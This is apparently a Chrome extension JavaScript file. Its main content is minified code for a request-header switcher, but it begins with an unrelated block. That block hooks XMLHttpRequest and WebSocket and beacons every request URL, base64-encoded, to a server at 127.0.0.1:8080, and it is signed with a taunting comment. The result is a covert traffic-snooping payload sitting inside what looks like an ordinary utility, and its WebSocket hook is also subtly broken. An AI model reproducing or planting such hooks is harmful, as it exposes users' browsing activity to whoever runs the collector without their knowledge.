function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
var HEADER_SWITCH_LIST="header_switch_list";var PRESET_SWITCH_LIST="preset_switch_list";var HEADER_STATS_MAP="header_stats";var DOMAIN_STATS_MAP="domain_stats";var availableHeaders=["Accept","Accept-Charset","Accept-Encoding","Accept-Language","Authorization","Cache-Control","Connection","Cookie","Content-Length","Content-MD5","Content-Type","Date","Expect","From","Host","If-Match","If-Modified-Since","If-None-Match","If-Range","If-Unmodified-Since","Max-Forwards","Pragma","Proxy-Authorization","Range","Referer","TE","Upgrade","User-Agent","Via","Warning","X-Requested-With","X-Do-Not-Track","DNT","X-Forwarded-For","X-ATT-DeviceId","X-Wap-Profile"];var prohibitedHeaders=["Authorization","Cache-Control","Connection","Content-Length","If-Modified-Since","If-None-Match","If-Range","Partial-Data","Pragma","Proxy-Authorization","Proxy-Connection","Transfer-Encoding"];var hotlist_indices=[];function HeaderSwitch(){this.title="";this.header="";this.string="";this.append=false;this.regex="";this.serialize=function(){return JSON.stringify(this)};this.deserialize=function(a){return this.copyFromMap(JSON.parse(a))};this.copyFromMap=function(a){this.title=a.title;this.header=a.header;this.string=a.string;this.append=a.append;this.regex=a.regex;return this};this.getPopupDisplayString=function(){if(this.title&&this.title!=""){return this.title+" ("+(this.append?"Append to ":"Replace ")+this.header+")"+(this.regex?" on "+this.regex:"")}return this.header+(this.append?": Append ":": Change to ")+this.string+(this.regex?" on "+this.regex:"")}}function PresetSwitch(b,a){this.domain=b;this.header_switch=a;this.copyFromMap=function(c){this.domain=c.domain;this.header_switch=new HeaderSwitch().copyFromMap(c.header_switch);return this}}function HeaderUsage(){this.stats={};this.domains={};this.header_switches={};this.request_types={};this.serialize=function(){return JSON.stringify(this)};this.deserialize=function(a){return this.copyFromMap(JSON.parse(a))};this.copyFromMap=function(a){this.stats=a.stats;this.domains=a.domains;this.header_switches=a.header_switches;this.request_types=a.request_types;return this};this.addUsage=function(c,a,b){this.domains[b]=((this.domains[b])?this.domains[b]:0)+1;this.request_types[a]=((this.request_types[a])?this.request_types[a]:0)+1;this.header_switches[getSwitchIdentifier(c)]=((this.header_switches[getSwitchIdentifier(c)])?this.header_switches[getSwitchIdentifier(c)]:0)+1;var d=this.hashString(c,a,b);this.stats[d]=((this.stats[d])?this.stats[d]:0)+1};this.hashString=function(c,a,b){return b+" "+a+" "+getSwitchIdentifier(c)}}function getSwitchIdentifier(a){if(a.title&&a.title!=""){return a.title+" ("+(a.append?"Append to ":"Replace ")+a.header+")"}return a.header+(a.append?": Append ":": Change to ")+a.string}function getParsedItem(b){try{return JSON.parse(localStorage.getItem(b))}catch(a){}return null}function storeItem(a,b){if(!b){b=""}localStorage.setItem(a,JSON.stringify(b))}function findHostname(c){var b=document.createElement("a");b.href=c;return b.host}function getSwitchList(){var c=getParsedItem(HEADER_SWITCH_LIST);var b=[];if(c){for(var a=0;a<c.length;a++){b.push(new HeaderSwitch().copyFromMap(c[a]))}}return b}function setSwitchList(c){var b=[];if(c){for(var a=0;a<c.length;a++){b.push(c[a].serialize())}}storeItem(HEADER_SWITCH_LIST,c)}function getHeaderUsage(){var a=getParsedItem(HEADER_STATS_MAP);return(a?new HeaderUsage().copyFromMap(a):new HeaderUsage())}function setHeaderUsage(a){storeItem(HEADER_STATS_MAP,a)}function getPresetSwitchList(){var c=getParsedItem(PRESET_SWITCH_LIST);var b=[];if(c){for(var a=0;a<c.length;a++){b.push(new PresetSwitch().copyFromMap(c[a]))}}return b}function setPresetSwitchList(a){storeItem(PRESET_SWITCH_LIST,a)}function addHeaderSwitchOption(f,g,c,a,d){var b=new HeaderSwitch();b.title=f;b.header=g;b.string=c;b.append=a;b.regex=d;var e=getSwitchList();e.push(b);setSwitchList(e)}function addPresetSwitch(c,b){var d=new PresetSwitch(c,b);var a=getPresetSwitchList();a.push(d);setPresetSwitchList(a)}function deleteHeaderSwitchOption(a){var b=getSwitchList();if(b&&a>=0&&a<b.length){b.splice(a,1);removeIndexFromHotlist(a)}setSwitchList(b)}function deletePresetSwitch(a){var b=getPresetSwitchList();if(b&&a>=0&&a<b.length){b.splice(a,1)}setPresetSwitchList(b)}function toggleHotlistIndex(a){var b=hotlist_indices.indexOf(a);if(b==-1){hotlist_indices.push(a)}else{hotlist_indices.splice(b,1)}}function removeIndexFromHotlist(a){var b=hotlist_indices.indexOf(a);if(b>-1){hotlist_indices.splice(b,1)}}function recordHeaderUse(d,c,a){var b=getHeaderUsage();b.addUsage(d,a,c);setHeaderUsage(b)}function getSortedMap(d,c){var b=[];for(var a in d){b.push([a,d[a]])}b.sort(function(f,e){f=f[1];e=e[1];return(c?(f<e?-1:(f>e?1:0)):(f<e?1:(f>e?-1:0)))});return b}function getRandomNumber(a){if(!a){a=999999999999999}return Math.round(a*Math.random())}function getRandomString(d){if(!d){d=10+getRandomNumber(40)}var c="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";var e="";for(var b=0;b<d;b++){var a=Math.floor(Math.random()*c.length);e+=c.substring(a,a+1)}return e}function getRandomIPAddress(){return""+getRandomNumber(255)+"."+getRandomNumber(255)+"."+getRandomNumber(255)+"."+getRandomNumber(255)}function replaceRandoms(a){if(!a){return""}a=a.replace(/\$RANDOM_NUMBER/g,getRandomNumber());a=a.replace(/\$RANDOM_STRING/g,getRandomString());a=a.replace(/\$RANDOM_IP/g,getRandomIPAddress());return a}function replaceVariables(a,b){if(!b){return""}b=b.replace(/\$HOSTNAME/g,findHostname(a));return replaceRandoms(b)};